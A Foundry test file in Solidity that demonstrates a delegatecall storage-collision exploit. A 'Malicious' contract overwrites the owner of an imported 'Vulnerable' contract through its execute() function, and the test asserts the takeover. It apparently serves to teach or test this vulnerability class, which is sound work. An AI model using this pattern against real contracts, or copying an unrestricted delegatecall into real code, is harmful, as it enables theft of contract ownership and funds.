// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/delegateCall.sol";

contract Malicious {
    address public owner;

    // Overwrite the storage of the vulnerable contract
    function attack() external {
        owner = address(0x1234);
    }
}

contract DelegatecallTest is Test {
    Vulnerable public target;
    Malicious public attacker;

    function setUp() public {
        target = new Vulnerable();
        attacker = new Malicious();
    }

    function testDelegatecallExploit() public {
        assertEq(target.owner(), address(this));
        console.log("Initial Owner", target.owner());

        // Prepare data to call the Malicious contract's attack function
        bytes memory data = abi.encodeWithSelector(attacker.attack.selector);

        // Execute the attack via delegatecall
        target.execute(address(attacker), data);

        console.log("New Owner", target.owner());
        // Assert that the owner of the Vulnerable contract has changed
        assertEq(
            target.owner(),
            address(0x1234),
            "Owner should be updated to attacker"
        );
    }
}
